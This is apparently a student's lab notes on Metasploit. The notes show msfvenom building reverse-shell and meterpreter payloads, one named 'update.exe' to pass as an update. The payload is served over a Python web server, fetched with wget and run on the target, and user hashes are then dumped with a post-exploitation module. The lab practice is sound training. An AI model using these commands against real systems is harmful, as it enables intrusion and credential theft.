# msfvenom
allows us to GENERATE payloads
- many different formats supported

`msfvenom`
- `-e` -> encoding payloads
- common usage: choosing payload, choosing format, encoding if necessary

example, testing security of Windows laptop
-> run msfvenom -p windows/shell_reverse_tcp -f exe -o update.exe
- -p = choose payload
- -f = format is .exe
- -o = saves as update.exe

Handler = listener
- waits and listens for the RETURN signal coming back from the target machine 
- ex: payload is on target machine, handler is on local machine -- > ports should match
- session begins after msfveom sends a loader

`10.67.164.30` -> vuln machine 

## Usage -> Practicing Executing Payloads + Extracting User Hash

2 virtual machines running, one target and one attack

Creating meterpreter payload, I chose
`msfvenom -p linux/x86/meterpreter/reverse_TCP LHOST=IP LPORT=PORT -f elf > onepiece.elf`

Then, I started a Python web server via
`python3 -m http.server 9000`
on the attacking machine

On the target machine, I fetched the onepiece.elf payload via
`wget http://IP:PORT/onepiece.elf`

Afterwards, I had to ensure that this field could execute. On Linux, this is
`chmod +x filename`
(explicitly -> `chmod +x ./filename`)

Attacking machine: set up a handler to listen 
`msf6 > use exploit/multi/handler`
Set options (LHOST + LPORT)
Also, do not forget to set payload because it is not the default `generic/shell_reverse_tcp`

Afterwards, ran the handler on attacking machine
Target machine can now run the payload

After target machine runs payload, the handler listens
meterpreter session is now successfully set up on target machine

Backgrounded the current session, now we are back in msfconole

Using post exploit module that can dump hashes of the users -> I used `post/linux/gather/hashdump`
Set options as required (SESSION -> 1)

ran the module, successfully extracted user hashes
```
msf6 post(linux/gather/hashdump) > sessions

Active sessions
===============

  Id  Name  Type                Information          Connection
  --  ----  ----                -----------          ----------
  1         meterpreter x86/li  root @ ip-10-67-164  10.67.93.32:4444 ->
            nux                 -30.ec2.internal      10.67.164.30:42812
                                                      (10.67.164.30)

msf6 post(linux/gather/hashdump) > set SESSION 1
SESSION => 1
msf6 post(linux/gather/hashdump) > run

```

:)